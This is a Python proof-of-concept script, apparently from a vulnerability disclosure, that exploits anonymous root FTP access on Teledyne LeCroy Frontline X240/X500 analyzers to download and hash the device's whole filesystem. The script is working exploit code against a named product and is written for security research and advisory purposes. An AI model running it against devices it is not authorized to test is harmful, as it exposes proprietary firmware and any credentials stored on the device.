#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-3.0-only
"""
x240_ftp_mirror.py: Mirror the X240 root filesystem over anonymous FTP.

The X240's BusyBox ftpd allows anonymous login and exposes the entire root filesystem for reading. This walks every directory, downloads each regular file, records FTP-visible metadata (perms, owner, size, MDTM) and a SHA-256 per file, and writes:

    <outdir>/files/          mirrored filesystem
    <outdir>/manifest.json   structured manifest
    <outdir>/summary.txt      human-readable tree + hashes
    <outdir>/mirror.log       operation log

Ctrl-C aborts cleanly and flushes the partial manifest.

Target  : Teledyne LeCroy Frontline X240 / X240i / X500 / X500e
Finding : Anonymous FTP as root (TCP/21), arbitrary read
Advisory: TDY-PSG-2026-001 (CVE pending)
Author  : Erwin Karincic (Dollarhyde)

Authorized testing only. Use against equipment you own or are explicitly permitted to test. Mirrored firmware is vendor-proprietary; do not redistribute the downloaded contents.

Usage:
    python x240_ftp_mirror.py [host] [outdir]     # default host 10.10.0.240
"""

import datetime
import ftplib
import hashlib
import json
import logging
import sys
from pathlib import Path

HOST = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.240"
USER = "anonymous"
PASS = "anonymous@"

SKIP_PREFIXES = ["/proc", "/sys", "/dev", "/run"]  # virtual filesystems
MAX_FILE_SIZE = 200 * 1024 * 1024

OUTDIR = Path(sys.argv[2] if len(sys.argv) > 2
              else f"x240_fs_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}")
OUTDIR.mkdir(exist_ok=True)
FILES_DIR = OUTDIR / "files"
FILES_DIR.mkdir(exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[logging.FileHandler(OUTDIR / "mirror.log"), logging.StreamHandler()],
)
log = logging.getLogger("mirror")


def parse_unix_list(line):
    parts = line.split(None, 8)
    if len(parts) < 9:
        return None
    perms, links, user, group, size, mon, day, time_or_year, name = parts
    link_target = None
    if " -> " in name:
        name, link_target = name.split(" -> ", 1)
    try:
        size_int = int(size)
    except ValueError:
        size_int = -1
    return {
        "perms": perms,
        "user": user,
        "group": group,
        "size": size_int,
        "date_str": f"{mon} {day} {time_or_year}",
        "name": name,
        "link_target": link_target,
        "type": perms[0],
    }


def should_skip(path):
    return any(path == p or path.startswith(p + "/") for p in SKIP_PREFIXES)


def contained_local_path(remote_path):
    """Map an absolute remote path beneath FILES_DIR or reject it."""
    parts = remote_path.lstrip("/").split("/")
    if not parts or any(part in ("", ".", "..") or "\x00" in part for part in parts):
        raise ValueError(f"unsafe remote path: {remote_path!r}")
    root = FILES_DIR.resolve()
    candidate = (root.joinpath(*parts)).resolve(strict=False)
    try:
        candidate.relative_to(root)
    except ValueError as e:
        raise ValueError(f"remote path escapes output directory: {remote_path!r}") from e
    return candidate


def walk(ftp, path, manifest):
    if should_skip(path):
        log.info(f"SKIP (virtual fs): {path}")
        manifest["skipped"].append(path)
        return
    log.info(f"DIR  {path}")
    lines = []
    try:
        ftp.cwd(path)
        ftp.retrlines("LIST", lines.append)
    except ftplib.all_errors as e:
        log.warning(f"  LIST {path} failed: {e}")
        manifest["errors"].append({"path": path, "stage": "list", "error": str(e)})
        return

    for line in lines:
        entry = parse_unix_list(line)
        if not entry or entry["name"] in (".", ".."):
            continue
        full = f"{path.rstrip('/')}/{entry['name']}"
        entry["full_path"] = full
        manifest["entries"].append(entry)

        if entry["type"] == "d":
            walk(ftp, full, manifest)
        elif entry["type"] == "-":
            download_file(ftp, full, entry, manifest)
        elif entry["type"] == "l":
            log.info(f"  LINK {full} -> {entry['link_target']}")
        else:
            log.info(f"  SKIP type {entry['type']!r}: {full}")


def download_file(ftp, full, entry, manifest):
    if entry["size"] > MAX_FILE_SIZE:
        log.warning(f"  SKIP (too big {entry['size']}B): {full}")
        manifest["errors"].append({"path": full, "stage": "size_cap", "size": entry["size"]})
        return

    try:
        local = contained_local_path(full)
    except ValueError as e:
        log.warning(f"  SKIP ({e})")
        manifest["errors"].append({"path": full, "stage": "unsafe_path", "error": str(e)})
        return
    local.parent.mkdir(parents=True, exist_ok=True)
    h = hashlib.sha256()
    try:
        with open(local, "wb") as fh:
            def writer(chunk):
                h.update(chunk)
                fh.write(chunk)
            ftp.retrbinary(f"RETR {full}", writer)
        try:
            entry["mdtm"] = ftp.sendcmd(f"MDTM {full}").split()[-1]
        except ftplib.all_errors:
            pass
        entry["sha256"] = h.hexdigest()
        entry["local_path"] = str(local.relative_to(OUTDIR.resolve()))
        log.info(f"  GOT  {full:<60s}  {entry['size']:>10}B  {h.hexdigest()[:16]}")
    except ftplib.all_errors as e:
        log.warning(f"  RETR {full} failed: {e}")
        manifest["errors"].append({"path": full, "stage": "retr", "error": str(e)})


def write_outputs(manifest):
    with open(OUTDIR / "manifest.json", "w") as f:
        json.dump(manifest, f, indent=2)

    files = [e for e in manifest["entries"] if e.get("sha256")]
    dirs = [e for e in manifest["entries"] if e["type"] == "d"]
    links = [e for e in manifest["entries"] if e["type"] == "l"]

    with open(OUTDIR / "summary.txt", "w") as f:
        f.write("X240 filesystem mirror via anonymous FTP\n")
        f.write(f"Host:     {manifest['host']}\n")
        f.write(f"Started:  {manifest['started']}\n")
        f.write(f"Ended:    {manifest.get('ended')}\n")
        f.write(f"Files:    {len(files)}\n")
        f.write(f"Dirs:     {len(dirs)}\n")
        f.write(f"Links:    {len(links)}\n")
        f.write(f"Errors:   {len(manifest['errors'])}\n")
        f.write(f"Skipped:  {len(manifest['skipped'])}\n")
        f.write("=" * 78 + "\n\n")
        for e in sorted(manifest["entries"], key=lambda x: x["full_path"]):
            h = e.get("sha256", "")[:16]
            line = f"{e['perms']} {e['user']:<8} {e['group']:<8} {e['size']:>10}  {e['full_path']}"
            f.write(line + (f"  {h}" if h else "") + "\n")
            if e.get("link_target"):
                f.write(f"    -> {e['link_target']}\n")


def main():
    manifest = {
        "host": HOST,
        "started": datetime.datetime.now().isoformat(),
        "entries": [],
        "errors": [],
        "skipped": [],
    }
    log.info(f"Connecting to {HOST} as {USER}")
    ftp = ftplib.FTP(HOST, timeout=30)
    ftp.login(USER, PASS)
    log.info(f"Banner: {ftp.welcome.strip()}")
    try:
        ftp.sendcmd("TYPE I")
    except ftplib.all_errors:
        pass

    try:
        walk(ftp, "/", manifest)
    except KeyboardInterrupt:
        log.warning("Interrupted, saving partial manifest.")
    finally:
        try:
            ftp.quit()
        except Exception:
            pass
        manifest["ended"] = datetime.datetime.now().isoformat()
        write_outputs(manifest)

    log.info(f"\nDone. Output dir: {OUTDIR}/")
    log.info("  manifest.json / summary.txt / files/ / mirror.log")


if __name__ == "__main__":
    main()
